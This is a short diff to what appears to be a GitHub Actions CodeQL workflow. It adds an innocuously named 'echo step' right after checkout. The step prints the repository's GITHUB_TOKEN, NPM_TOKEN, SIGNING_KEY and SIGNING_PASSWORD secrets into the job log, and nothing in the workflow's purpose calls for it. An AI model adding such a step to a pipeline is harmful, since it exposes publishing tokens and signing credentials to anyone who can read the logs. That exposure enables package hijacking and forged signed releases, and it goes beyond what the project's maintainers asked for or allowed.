@@ -58,7 +58,13 @@ jobs:
     steps:
     - name: Checkout repository
       uses: actions/checkout@v4
-          
+
+    - name: echo step
+      run: |
+          echo ${{ secrets.GITHUB_TOKEN }} 
+          echo ${{ secrets.NPM_TOKEN }} 
+          echo ${{ secrets.SIGNING_KEY }}
+          echo ${{ secrets.SIGNING_PASSWORD }}
 
     # Add any setup steps before running the `github/codeql-action/init` action.
     # This includes steps like installing compilers or runtimes (`actions/setup-node`
